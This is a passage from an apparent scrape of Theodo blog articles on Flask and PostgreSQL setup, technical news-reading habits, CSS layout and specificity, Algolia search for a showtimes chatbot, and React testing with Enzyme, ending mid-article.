USER postgres WITH ENCRYPTED PASSWORD 'password';\r\n\nThen, still in psql, create a database \u201cmy_database\u201d:\npostgres=# CREATE DATABASE my_database;\r\n\nHere is what your code could look like, the previous paragraphs should enable you to understand the role of each line, and even better you should be able to modify it without breaking your app \ud83d\ude09 e.g. if you prefer defining your db object in app.py.\nOverall, your application folder should look like:\n    application_folder\r\n    \u251c\u2500 app.py\r\n    \u251c\u2500 manage.py\r\n    \u2514\u2500 models.py\r\n\napp.py file, used to run the app and connect the database to it.\nfrom flask import Flask\r\nfrom models import db\r\n\r\napp = Flask(__name__)\r\n\r\nPOSTGRES = {\r\n    'user': 'postgres',\r\n    'pw': 'password',\r\n    'db': 'my_database',\r\n    'host': 'localhost',\r\n    'port': '5432',\r\n}\r\n\r\napp.config['DEBUG'] = True\r\napp.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://%(user)s:\\\r\n%(pw)s@%(host)s:%(port)s/%(db)s' % POSTGRES\r\ndb.init_app(app)\r\n\r\n@app.route(\"/\")\r\ndef main():\r\n    return 'Hello World !'\r\n\r\nif __name__ == '__main__':\r\n    app.run()\r\n\nmodels.py file to define tables models.\nfrom flask_sqlalchemy import SQLAlchemy\r\nimport datetime\r\n\r\ndb = SQLAlchemy()\r\n\r\nclass BaseModel(db.Model):\r\n    \"\"\"Base data model for all objects\"\"\"\r\n    __abstract__ = True\r\n\r\n    def __init__(self, *args):\r\n        super().__init__(*args)\r\n\r\n    def __repr__(self):\r\n        \"\"\"Define a base way to print models\"\"\"\r\n        return '%s(%s)' % (self.__class__.__name__, {\r\n            column: value\r\n            for column, value in self._to_dict().items()\r\n        })\r\n\r\n    def json(self):\r\n        \"\"\"\r\n                Define a base way to jsonify models, dealing with datetime objects\r\n        \"\"\"\r\n        return {\r\n            column: value if not isinstance(value, datetime.date) else value.strftime('%Y-%m-%d')\r\n            for column, value in self._to_dict().items()\r\n        }\r\n\r\n\r\nclass Station(BaseModel, db.Model):\r\n    \"\"\"Model for the stations table\"\"\"\r\n    __tablename__ = 'stations'\r\n\r\n    id = db.Column(db.Integer, primary_key = True)\r\n    lat = db.Column(db.Float)\r\n    lng = db.Column(db.Float)\r\n\nmanage.py file to run migrations.\nfrom flask_script import Manager\r\nfrom flask_migrate import Migrate, MigrateCommand\r\nfrom app import app, db\r\n\r\n\r\nmigrate = Migrate(app, db)\r\nmanager = Manager(app)\r\n\r\nmanager.add_command('db', MigrateCommand)\r\n\r\n\r\nif __name__ == '__main__':\r\n    manager.run()\r\n\nFinally, run database migrations and upgrades. In a terminal:\n\npython manage.py db init\n This will create a folder called migrations with alembic.ini and env.py files and a sub-folder migrations which will include your future migrations. It has to be run only once.\n\npython manage.py db migrate\n Generates a new migration in the migrations folder. The file is pre-filled based on the changes detected by alembic, edit the description message at the beginning of the file and make any change you want.\n\npython manage.py db upgrade\n Implements the changes in the migration files in the database and updates the version of the migration in the alembic_version table.\nCommon Mistakes \u2013 and Some Solutions\nCould not connect to server\nsqlalchemy.exc.OperationalError: (psycopg2.OperationalError) could not \r\n  connect to server: Connection refused\r\nIs the server running on host \"localhost\" (127.0.0.1) and accepting\r\nTCP/IP connections on port 5432?\r\n\nThe previous error stands when the declared host is \u201clocalhost\u201d and the port is \u201c5432\u201d but it could be anything else depending on your context. It\u2019s likely your PostgreSQL server is not running or not allowing the chosen connection protocol. See PostgreSQL documentation about Client Connection Problems.\n\n\ncheck that PostgreSQL server is running: ps -aux | grep \"[p]ostgres\" or service postgresql status\n\n\nstart it if needed: /etc/init.d/postgresql start or service postgresql start \u2013 more information in the documentation.\n\n\nif needed, modify the the config file indicated in the output of ps -aux, likely /etc/postgresql/X.X/main/postgresql.conf where X.X is your PostgreSQL version, to accept TCP/IP connections. Set listen_addresses='localhost'.\n\n\nand check the pg_hba.conf file in the same repository, to make sure connections from localhost are allowed.\n\n\nrestart PostgreSQL server: /etc/init.d/postgresql restart\n\n\nNo password supplied\nOperationalError: fe_sendauth: no password supplied\nTo solve this issue, several options:\n\n\nChange the uri of the database to something that does not require secured authentication, like : postgresql://database_name which changes the type of connection to the database.\n\n\nActually read the error message and provide a password, passing an empty string '' if your database user has no password will not work.\n\n\nModify the connection rights associated with your database user in postgres configuration file named pg_hba.conf lileky located in /etc/postgresql/X.X/main where X.X is your PostgreSQL version. Writing something like:\n\n\nhost  all  postgres  127.0.0.1  md5\n\n\nEverything about the pg_hba.conf file here.\n\n\nClass does not have a table or tablename specified\nInvalidRequestError: Class does not have a table or tablename specified \r\nand does not inherit from an existing table-mapped class\r\n\nThis occurs when trying to define a base model. This is actually an abstract class, never instantiated as such but inherited, the parameter __abstract__ = True has to be set when defining the base model class so that SQLAlchemy does not try to create a table for this model as explained here.\nclass BaseModel(db.Model):\r\n    __abstract__ = True\r\n\nError when calling metaclass bases\nTypeError: Error when calling the metaclass bases\r\nCannot create a consistent method resolution order (MRO)\r\n\nIf you have created a base model (let\u2019s call it BaseModel) which inherits from db.Model, and then use it to define other models which also inherit from db.Model, it is possible you mixed the inheritance order: BaseModel should be first and then db.Model so that the method resolution order is consistent and BaseModel methods are not overrided by db.Model methods which have previously been overrided by BaseModel methods. Find out more on stackoverflow.\nYour class should begin with:\nclass YourModel(BaseModel, db.Model):\r\n\nNo application bound to current context\nApplication not registered on db instance and no application\r\n  bound to the current context\nYou have to link the application and the database object using db.init_app(app) or db.app = app (or both). Find out more on stackoverflow or in this blog post by Piotr Banaszkiewicz.\nAlembic states that there is nothing to migrate\nIf it appears that Alembic does not detect change despite the few lines you just added to your models, then make sure that you did not defined several SQLAlchemy object: there should be just one db instance (db = SQLAlchemy()) that you import in the other files.\nLet\u2019s say you wrote db = SQLAlchemy() in models.py, then in app.py you should have from models import db and nothing like a second db = SQLAlchemy()\nDatabase is not up to date\nalembic.util.exc.CommandError: Target database is not up to date.\nWell, the last Alembic version available in the migrations/versions/ is not the one indicated in your database alembic_version table (created by Alembic). Run python manage.py db upgrade to implement the migrations changes in the database.\nSome great resources\n\nA ready to use Flask App starter kit by antkahn, to go further than linking an app and a database!\nMore on how to run migrations with Alembic on realpython.com\nTutorial on a Flask \u2013 MySQL app with a frontend on code.tutsplus.com by Jay.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAdrien Agnel\r\n  \t\t\t\r\n  \t\t\t\tAgile Web Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tBesides side projects, technical watch (reading articles, watching talks, listening to podcast)\u00a0is the best way to discover new technologies, to learn useful technical tips, to improve your methodology and so on.\nTechnical Watch is like Devops: you have to be equipped to be efficient. The very first thing you should do to start is to install a tool like Pocket. With the app and the chrome extension you can stash and read articles everywhere.\n\nNow, you have to find sources. Here are some examples, but feel free to ask around you what people are reading:\n\nDownload Materialistic\u00a0which is the Hackernews app. You can screen the thirty first articles of the Catch Up section which gathers the most popular articles within the 24 hours. Same approach could be done with Reddit and once you\u2019ve chosen your topics.\n\n\nCreate a Twitter account and follow the main contributor your favorite language or of a library you like. Follow the awesome speaker you saw at the last meetup or your colleague who always knows the new on-trend tool (see below). Or add my two favorite: Addy Osmani working on Google Chrome and the Dev.to blog. If someone pollutes your feed with a lot of useless information, don\u2019t hesitate to get rid of him. A messy feed is an inefficient feed.\u00a0\nNetwork\u00a0with other developers : talk with your colleagues about their side-projects and enjoy meetups like HumanTalks\u00a0to always discover new subjects or specialized meetup like ReactJS.\nRead blogs from the major tech company like Airbnb, Github, Instagram, Uber\u2026 You can either follow their Twitter accounts or subscribe to their RSS feed.\n\n\nSubscribe to technical newsletters like JS weekly or DevOps weekly.\n\nThen you should create your own routine. Book 10 minutes each day to source content. For instance, I do that during breakfast. If it takes less than 30 seconds to read, read it now, if it takes longer stash it in our favorite app. Next find a daily slot to read the articles you\u2019ve selected. The 20 minutes in the subway are much more useful since I\u2019ve started this routine!\nIt\u2019s important to regenerate your sources often otherwise the number of interesting articles will drop dramatically.\nThus, every two months, look at the list of people you\u2019re following on Twitter, and remove the one whom you haven\u2019t read a tweet within the month.\nIf you haven\u2019t found any interesting articles on Hackernews since 15 days, switch to Reddit.\nFinally if you want to look deeper into a specific subject, books could be your best ally. That\u2019s how Benjamin, the CTO of Theodo, learnt how to code in Ruby and that\u2019s how I\u2019m learning how to work effectively with legacy code.\nAnd what about you? I would be glad to learn what your tips are to do efficient technical watch!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAurore Malherbes\r\n  \t\t\t\r\n  \t\t\t\tWeb Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tDo you sometimes try position: relative then absolute then relative again?\nDoes it take you more than 2 seconds to decide whether you\u2019re going to use padding or margin?\nHave you ever added more than 5 classes to make your CSS work?\nIf you said yes to one of these questions don\u2019t be ashamed, you\u2019re not alone.\nBut don\u2019t be afraid, acquiring those skills is a lot easier than you probably think.\nRelative or Absolute? Find the reference of your movement!\n\nThe position attribute has 5 different values: static, relative, absolute, fixed and sticky.\nWhereas fixed is quite straightforward and sticky is still barely used as its support is still limited, many developers struggle to use relative and absolute on point.\nSo let\u2019s dig into the differences between these positions and find an easy rule to decide which one to use.\nIf you want to experiment with static, relative and absolute positions, I\u2019ve made a Codepen on purpose.\n\nPerhaps even Albert Einstein hesitated between relativity and absolutivity\nStatic\nThat one is the default value.\nIt will add it to the flow as it is defined by other propopreties such as display, margin or padding.\nIf you try to use top, bottom, left or right it will have no effect.\nRelative\nposition: relative will move the element from the position it would have had, had it been positionned with static.\nSo using left: 20px will move your element 20 pixels on the left from its static position.\nOne more thing to notice is that elements around will behave as if its position were static.\nAbsolute\nIf you use top: 0 and left: 0;, your element will go on the top left corner of its first non static parent element.\nBe careful: if the element\u2019s parent\u2019s position is static, it won\u2019t be the reference!\nIf you want to make it\u00a0the reference, there\u2019s one simple trick : using position: relative\u00a0for the parent \ud83d\ude09\nAlso, all its siblings and parent elements will behave as if it didn\u2019t exist.\nSo, how to decide over relative or absolute?\n\u00a0\nThe key is to identify the reference for the position.\nposition: relative is to be used when you want to move an element from its static position.\nWhen you want to move your element inside its parent, then position: absolute is the best choice.\nMargin or Padding? Imagine your element was clickable!\n\nWhen you want to set spaces between elements in CSS you can either use margin or padding.\nThe 4 main differences between the 2 properties are:\n\nmargin is applied outside the border of an element, whereas padding is applied inside\nthe padding zone of an element is clickable if the element is clickable, the margin zone is not\nthe padding zone of an element has the same background color as the element, the margin zone the same as the element behind\nvertical margin values collapse \u2013 unless one of your elements is positionned with absolute or floating \u2013 see this Codepen\n\nSo, how to choose between the two?\nWell if the element I want to space has borders, it is pretty easy to find out: if the space is outside the borders then I use margin, otherwise I use padding.\nBut when it\u2019s not the case, I ask myself:\nIf the element was clickable, could I click on the space?\nOr its variant:\u00a0If the element had a background color, would the space had the same?\nIf so then I use padding!\n\u00a0\nHow many classes do I need to add? Know the rules of specificity!\nLet\u2019s say I want to center a paragraph, inside a div which has a class called intro. I could write it like:\n.intro p {\r\n  text-align: center;\r\n}\r\n\nBut sometimes it would not work, and when I opened my Dev Tools I would see this:\n\nCrap! Looks like Chrome has decided to take another rule before mine!\nHow can I override this? Well, there are some lazy ways: put !important which basically overrides everything, or put it as inline CSS.\n\nBut it is a bad idea to use !important, because if you want to override this rule later, well, you\u2019ll have no choice but to add an !important (and then, nothing becomes important anymore\u2026).\nSo how can I apply my new CSS rule?\nTo decide which rule to apply over another, Chrome\u00a0uses\u00a0the specificity\u00a0of each rule.\nHere is a simplified way of how it works:\n\nthe rule with the more ids wins\n\ne.g.\u00a0#lean\u00a0> .waterfall\n\n\nif there is a draw, the rule with the more classes wins\n\ne.g. .scrum .agile\u00a0> li.stock\n\n\nif there is a draw, the rule with the more tags wins\n\ne.g. ul\u00a0li a.improvement >\u00a0p.rework a\n\n\nif there is a draw, the rule declared last in the stylesheet wins\n\nFinal Word\nI\u2019ve met a lot of web developers who understand closures, functional programming, lambda calculus or who can retro-engineer APIs, package applications with Webpack in their sleep or even code efficiently with Vim.\nYet, these briliant people were completely naked when it came to centering a button on a page.\nIs it because it is super hard to do? Certainly not.\nIs it because they\u2019re not clever enough? Probably not.\nI can\u2019t tell for them, but I can tell for myself. For a long, long time I assumed CSS was easy, and not worth spending time to study it in depth. I even felt a bit ashamed every time I googled something about style. But it\u2019s not because something is simple that you should not try to master it. On the contrary, it takes only a few minutes to\u00a0understand\u00a0some\u00a0subtleties and that can\u00a0save you a lot of pain.\nThere\u2019s still a lot you can learn about CSS in the next minutes like why it does not make any sense to use z-indexes over 10 in most applications, how float works or you can get into flexbox if you\u2019ve got more time.\nIf you liked this article or you know fellow developers who might learn some tricks from it please share it, and leave a comment below if you think it can be improved!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLouis Zawadzki\r\n  \t\t\t\r\n  \t\t\t\tI drink tea and build web apps at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIn my first article, I talked about creating an MVP with a Chatbot and showed an example with Cinebot\nBut getting the bot up and running wasn\u2019t enough.\nIt needed to be able to search complex data from text and location queries sent by the user through Messenger.\nSo I started to look for a cheap and flexible solution to store and retrieve data. At around the same time I heard about Algolia, a French company\u00a0providing exhaustive search capabilities through a SaaS platform, and decided it was worth trying out.\nIn this article I\u2019ll explain how I tuned Algolia to provide relevant search for my users in just a few hours.\nIntroduction\nAlgolia acts as a data store, so I will fetch the screenings data daily using cron jobs and upload it there.\nThis will allow my chatbot to use Algolia\u2019s exhaustive search capabilities to return relevant data.\nHere is a diagram to show what the architecture of the project looks like:\n\n\ud83d\udcb5 Algolia Free Plan: Discovery\nAlgolia Free Plan includes 10,000 records and 100,000 operations (an operation can be adding a record or querying the database).\nIt\u2019s quite limited but enough for my MVP: creating a chatbot to help Parisians find showtimes in their city.\nFor approximately all the Paris and surrounding area, I have 2,500 records per day.\nWhich means ~30\u00d72,500 = 75,000 operations per month, which fits into the free plan.\nN.B: In order to use Algolia Free Plan, you must put their logo somewhere in your product\nCreating an index and getting the keys \ud83d\udc46\nFirst you need to go to https://www.algolia.com/explorer/indices and to create a new index (the equivalent of a MongoDB collection, that will hold your records).\nGive it the name you want, I called mine cine_seances.\nThen head to https://www.algolia.com/api-keys to get your Application ID and Admin API Key.\nThen we\u2019re ready to roll.\nData Description\nThe searchable items are releases: they represent all the screenings for a given movie in a given cinema, on a given day:\n{\r\n  \"place\": {\r\n    \"name\": \"Le Cin\u00e9ma des Cin\u00e9astes\",\r\n    \"city\": \"Paris 17e arrondissement\",\r\n    \"postalCode\": \"75017\",\r\n  },\r\n  \"movie\": {\r\n    \"title\": \"Moonlight\",\r\n    \"language\": \"Anglais\",\r\n    \"vo\": true,\r\n    \"posterUrl\": \"http://images.allocine.fr/pictures/17/01/26/09/46/162340.jpg\",\r\n    \"pressRating\": 4.18421,\r\n    \"userRating\": 4.07561159,\r\n    \"url\": \"http://www.allocine.fr/film/fichefilm_gen_cfilm=242054.html\",\r\n    \"is3D\": false,\r\n    \"releaseDate\": \"2017-02-01\",\r\n    \"trailerUrl\": \"http://www.allocine.fr/video/player_gen_cmedia=19565733&cfilm=242054.html\"\r\n  },\r\n  \"date\": \"2017-02-24\",\r\n  \"times\": {\r\n    '13:15': 'https://tickets.allocine.fr/paris-le-brady/reserver/F191274/D1488024900/VO',\r\n    '17:30': 'https://tickets.allocine.fr/paris-le-brady/reserver/F191274/D1488040200/VO',\r\n    '19:45': 'https://tickets.allocine.fr/paris-le-brady/reserver/F191274/D1488048300/VO',\r\n    '22:00': 'https://tickets.allocine.fr/paris-le-brady/reserver/F191274/D1488056400/VO'\r\n  },\r\n  \"_geoloc\": {\r\n    \"lat\": 48.883658,\r\n    \"lng\": 2.327202\r\n  }\r\n}\r\n\nUpdating the data\nAlgolia provides clients for many languages which means you can work with the language of your choice.\n\nI went\u00a0with Javascript since my bot is developed in Javascript. Hence, I needed to install two Javascript packages and add the corresponding two lines on top of every .js file where I\u2019ll use Algolia:\nnpm install --save algoliasearch\r\nnpm install --save algoliasearch-helper\r\n\nconst algoliasearch = require('algoliasearch');\r\nconst algoliasearchHelper = require('algoliasearch-helper');\r\n\nUploading fresh data\nThe clients allow for batch uploading of JSON arrays, which is quite convenient.\nHowever two days of screenings are contained in a 3.4Mb JSON array, and batch uploading the entire array often timed-out.\nA solution is to upload small chunks of 100 screenings. With asynchronous Javascript, uploading does not take more than 5 seconds.\nconst algoliaIndexName = 'cine_seances';\r\nconst algolia = algoliasearch(APP_ID, ADMIN_API_KEY, {\r\n    timeout: 5000\r\n});\r\n\r\nconst showtimes = require('./showtimes.json');\r\nconst _ = require('lodash');\r\nconst index = algolia.initIndex(algoliaIndexName)\r\n_(showtimes).chunk(100).forEach((chunk) => {\r\n  index.addObjects(chunk, function(err, content) {\r\n    // ...\r\n  });  \r\n});\r\n\nDeleting old data\nSince the free plan can only contain two days worth of data, every upload of a new batch means clearing all the records currently held in the database before uploading new ones.\nindex.clearIndex(function(err, content) {\r\n  // OMG TOTAL WIPEOUT \ud83d\ude31\r\n  _(showtimes).chunk(100).forEach((chunk) => {\r\n    index.addObjects(chunk, function(err, content) {\r\n      // \ud83d\udcaf\r\n    });  \r\n  });\r\n});\r\n\nAlgolia Configuration\nOnce the data is in there, it\u2019s very simple to select the fields that will be searchable through Algolia, and the order in which they should be displayed to the user. It all happens in the index dashboard at https://www.algolia.com/explorer#?index=cine_seances\nSearchable Attributes\n\nAfter experimenting a bit, I found out the following order for the attributes that were important in the search:\n1) Postal code\n2) Movie Title\n3) City\n4) Theater Name\nAll that is needed is to add the attributes through the interface and order them in the way I want them to be prioritized.\nEnabling Geolocation \ud83c\udf0f\nA key feature I needed\u00a0in the bot was the ability for the users to send their location and discover screenings around them.\nFacebook Messenger allows you to prompt the user for his location, which can be useful as a fallback when the user does not understand how to talk to your chatbot.\nWhen no screening is found based on the query, the bot prompts the user to send its location instead.\nAnd then getting the location back from the message:\nif(event.message && event.message.attachments) {\r\n    const attachment = event.message.attachments[0];\r\n    if(attachment.type === 'location') {\r\n        const location = {\r\n          'latitude': attachment.payload.coordinates.lat,\r\n          'longitude': attachment.payload.coordinates.long,\r\n        }\r\n    }\r\n}\r\n\nEnabling geolocation search is simple with Algolia as you only need to add a _geoloc field to your records and enable Geosearch in the Dashboard:\n{\r\n  ...\r\n  \"_geoloc\": {\r\n    \"lat\": 48.883658,\r\n    \"lng\": 2.327202\r\n  }\r\n}\r\n\n\nThen by adding a query parameter aroundLatLng, you will get the results sorted based on distance.\nYou even get the distance in meters to the cinema, which you can then display to the user.\nalgoliaHelper.setQueryParameter('getRankingInfo', true);\r\nalgoliaHelper.setQueryParameter('aroundLatLng', `${location.latitude},${location.longitude}`);\r\n\r\nalgoliaHelper.setQuery('').search();\r\nalgoliaHelper.on('result', (result) => {\r\n  const hits = result.hits;\r\n  console.log(`Closest result is ${hits[0]._rankingInfo.matchedGeoLocation.distance} meters away.`)\r\n});\r\n\nCustom Ranking \u2b50\nSince I also had the information about the movie ratings, I wanted the results to be displayed in an order based not only on the proximity, but also on the quality of the movie.\nTo do so I defined Custom Ranking Attributes just below the searchable-attributes in the console, and Algolia sorts it out by itself.\n\nFaceting for Same Day Retrieval\nAfter setting up the ordering of results, I wanted to retrieve only the screenings for the date of today.\nTo do so I used faceting which allows me to index a field with a limited number of discrete values to make them easily searchable.\nBy faceting the date field, I was able to query all the showtimes for today\u2019s date.\n\nthis.algoliaParams = { facets: ['date'], hitsPerPage: 10 };\r\nconst algoliaHelper = algoliasearchHelper(this.algolia, this.algoliaIndexName, this.algoliaParams)\r\n\r\nalgoliaHelper.addFacetRefinement('date', today);\r\nalgoliaHelper.setQuery('La La Land').search();\r\nalgoliaHelper.on('result', (result) => {\r\n  const hits = result.hits;\r\n  console.log(`${hits.length} showtimes for La La Land today.`)\r\n});\r\n\nTypo Tolerance\nWith Algolia you can also fine tune typo-tolerance on every field: if it should be enabled or not, the minimum number of characters before accepting 1 or 2 typos, and if stop words should be removed for example.\nFor a more exhaustive list, scroll down to this section on your index page.\n\nThat\u2019s it, folks!\nIn a few hours, I was able to get Algolia configured to perform complex queries on my dataset and provide fast and relevant search to my users based on what their textual query as well as their location if they wish to share it.\n\u00a0\n\nI\u2019d definitely recommend Algolia to anyone who wants to perform search on a slightly complicated dataset without the overhead of setting up an in-house solution.\nHowever, getting more space and operation capacity comes at a cost: 49,9$/month for Starter Plan with 100\u2019000 records and 1\u2019000\u2019000 operations. So you\u2019d better have a product that makes money \ud83d\udcb7\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJeremy Gotteland\r\n  \t\t\t\r\n  \t\t\t\tFull-Stack Developer @ TheodoUK in London. When I don't debug my code  with my rubber duck, you can find me coding useful (and less useful) products with loads of emojis.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tReact has quickly climbed its way to being a top framework choice for Javascript single page applications.\nWhat\u2019s not to like?\n\nA declarative syntax for UI\nVirtual-DOM for performance\nThe possibility of server-side rendering.\n\nThere is however one area that could be improved; its built-in testing utilities \u2013 and this is where Enzyme steps in as the must have tool for front-end React testing.\nThis is an example of a test using the native utilities of the framework:\nconst myRenderer = ReactTestUtils.createRenderer();\r\nmyRenderer.render(<myComponent/>);\r\nconst output = renderer.getRenderOutput();\r\nconst result =  scryRenderedDOMComponentsWithTag(output, div);\r\n\r\nexpect(result[0].props.children).toEqual([\r\n    <p>Title</p>\r\n]);\r\n\nIts verbose, long-winded and not that fun to develop with. The alternative put forward, Enzyme, brings it down to something much more expressive and readable:\nconst wrapper = shallow(<myComponent/>);\r\nexpect(wrapper.find('div').html()).to.equal('<p>Title</p>');\r\n\nUsing the all-powerful find function\nEnzyme uses cheeriojs \u2013 a small library that implements a subset of jQuery\u2019s core functionalities and makes manipulating components simple. The find() function, used in the example above, can be applied to HTML, JSX and CSS alike \u2013 this is key to Enzyme; It gives you the ability to target DOM elements in a clear and concise manner. Here are a few examples of how it can be applied:\ncomponentToTest.find('div'); // On HTML tags\r\ncomponentToTest.find('.pretty > .red-row'); // On CSS selectors\r\ncomponentToTest.find('div .nice-style'); // Both !\r\ncomponentToTest.find('label[visible=true]'); // On properties\r\n\nThe different rendering modes\n\nTo understand Enzyme\u2019s key strengths, let\u2019s dive a little into how it simulates components and DOM elements. Although based off react-test-utils, there is enough abstraction that the rendering of a component comes down to 3 functions \u2013 shallow, mount and render. Basically ;\n\n\nShallow rendering : Is useful to test a component in isolation of every other. In the typical React pattern of smart and dumb components, shallow rendering is usually used to test \u2018dumb\u2019 components (stateless components) in terms of their props and the events that can be simulated.\n\n\nMounting : Also known as full DOM rendering, it allows you to render a part of the DOM tree and it also gives you access to the lifecycle methods of React components (ComponentWillMount, ComponentWillReceiveProps , etc\u2026)\n\n\nStatic rendering : Is sparsely used but when it is the case, serves as means of testing plain JSX / HTML.\n\n\nPrior knowledge\nThis article assumes a classic React stack making use of npm scripts, webpack as a module bundler along with ES6 syntax and it will detail a simple approach to testing your React application.\nYou may also want to have a quick look at this article if your application uses Redux (link to the article), as it is a common library used in React applications and knowing how to test it may be helpful, in complement to what is explored in this article.\nEnjoy!\nSetup\nEnzyme is completely agnostic to the test runner and assertion libraries that you use; it works with mocha, AVA, Jest\u2026 you choose! In this article we will use, without going into too much detail, the following testing tools \u2013 so you can keep using your favourites, for me it\u2019s:\n\nJest as the test runner (although it also handles assertions and spies, I still want to use chai and sinon alongside it because of the syntaxic addons with chai-enzyme and sinon-chai).\nChai as the assertion library.\nSinon for mocks, stubs and test spies.\n\nFor jest the setup is simple, just remember to suffix your test files with .test.js (default configuration):\nnpm install --save-dev jest\r\n\nAnd add the following scripts to your package.json scripts object :\n\"client:test\": \"NODE_ENV=test jest\",\r\n\"client:test:watch\": \"NODE_ENV=test jest --watch\"\r\n\nAlong with an object at the root of the package.json with jest as a key that configures the jest testing tool (I\u2019ll just include a few key options):\n\"jest\": {\r\n    \"rootDir\": \"./client/src\",\r\n    \"moduleNameMapper\": {\r\n        \"^.+\\\\.(css|less)$\": \"<rootDir>/CSSStub.js\"\r\n    },\r\n    \"collectCoverage\": true,\r\n    \"coverageDirectory\": \"<rootDir>/../../coverage\",\r\n    \"verbose\": true,\r\n    \"coveragePathIgnorePatterns\": [\r\n        \"<rootDir>/../../node_modules/\"\r\n    ]\r\n}\r\n\nImportant: The moduleNameMapper options allows you to mock a module for files that match a particular extension. In projects using webpack it is quite typical to load css inline using the webpack css-loader. The problem is Jest doesn\u2019t know how to interpret the css , so instead make a stub that resolves all inline styles to an empty object contained in <rootDir>/CSSStub.js\nAlso don\u2019t forget to include these libraries of course!\nnpm install --save-dev enzyme chai-enzyme sinon\r\n\nShallow render and the enzyme API in general\nA shallow rendered and a mounted component, have the same methods exposed but different use cases (as in, you will find the same API in the Enzyme docs for both). As a rule of thumb, shallow render is for unit testing and will probably be used for the majority of your test cases. Mounting would be more for a form of \u2018front-end integration testing\u2019 (seeing how a change in one component propagates to other components lower in the DOM tree).\nTesting your component in terms of data\nLet\u2019s use a small snippet of code that renders a rectangle of a certain color, some text and a checkbox. Not an enthralling example, but a useful one in showing how enzyme works.\nimport React, { PureComponent } from 'react';\r\n\r\nclass ColoredRectangleComponent extends PureComponent {\r\n  render() {\r\n    return (\r\n      <div className={this.props.elementClass}>\r\n        {`Square text : ${this.props.text}`}\r\n        <input\r\n          type=\"checkbox\"\r\n          id=\"checked\"\r\n          value=\"active\"\r\n          checked=\"checked\"\r\n          onClick={(event) => { this.props.onCheckboxChange(event); }}\r\n        />\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nexport default ColoredRectangleComponent;\r\n\nWe want to test three things to begin with; we expect a div, with the correct class and some text. Note that once you have rendered a component for the test, you can easily control the data it handles with setProps() and setState(). You can also access the props and state of a component with props() and state(). This is particularly interesting when testing different outcomes in your component\u2019s display (for instance; hiding part of a component, checking if an error label appears, etc\u2026).\nimport React from 'react';\r\nimport chai, { expect } from 'chai';\r\nimport chaiEnzyme from 'chai-enzyme';\r\nimport { shallow } from 'enzyme';\r\nimport sinon from 'sinon';\r\nimport ColoredRectangleComponent from './enzyme';\r\n\r\nchai.use(chaiEnzyme());\r\n\r\nconst clickSpy = sinon.spy();\r\nconst props = {\r\n  checked: true,\r\n  elementClass: 'red-square',\r\n  text: 'Enzyme rocks',\r\n  onCheckboxChange: clickSpy,\r\n};\r\n\r\nconst container = shallow(<ColoredRectangleComponent {...props} />);\r\n\r\ndescribe('tests for <ColoredRectangleComponent> container', () => {\r\n  it('should render one div', () => {\r\n    // You can target DOM, its children(), or an element at() a position\r\n    expect(container.find('div').length).to.equal(1);\r\n  });\r\n\r\n  it('should render one div with the correct class applied', () => {\r\n    expect(container.find('div').hasClass('red-square')).to.equal(true);\r\n  });\r\n\r\n  it('should contain the text passed as props', () => {\r\n        expect(container.text()).to.equal('Square text : Enzyme rocks');\r\n        // Here is an alternative making use of html()\r\n        expect(container.find('p').html()).to.equal('<p>Square text : Enzyme rocks</p>');\r\n  });\r\n\r\n    [...]\r\n\nTesting your component in terms of events\nYou are going to want to simulate user interactions with your component. This is where chai-enzyme steps in to provide a variety of assertion addons that will simplify your test syntax. As we are using a checkbox, a quick look at the docs tell us that we are interested by (not.?)to.be.checked().\n    [...]\r\n\r\n    it('should render a checked checkbox if prop value is true', () => {\r\n        expect(container.find('#checked')).to.be.checked();\r\n    });\r\n\r\n    [...]\r\n\nIf we refer back to our tested component, a function is passed down through props and should be triggered upon clicking the element it is bound to (in this case the input tag). For the moment, event propagation and more complex mouse interactions are actively being developped but most use cases are already covered.\n    [...]\r\n\r\n    it('should trigger onCheckboxChange when simulating a click event on checkbox', () => {\r\n    container.find('#checked').simulate('click');\r\n    expect(clickSpy.calledOnce).to.equal(true);\r\n  });\r\n\r\n});\r\n\nMounting a component\nThere may be instances where you don\u2019t want to fully mount a part of the DOM just to test one nested component inside a shallowRendered component. In this case use dive() \u2013 but for every other complex case where several nested components need to be tested together, use mount. Let\u2019s have a look at a parent component that makes use of our ColoredRectangleComponent:\nimport React, { Component } from 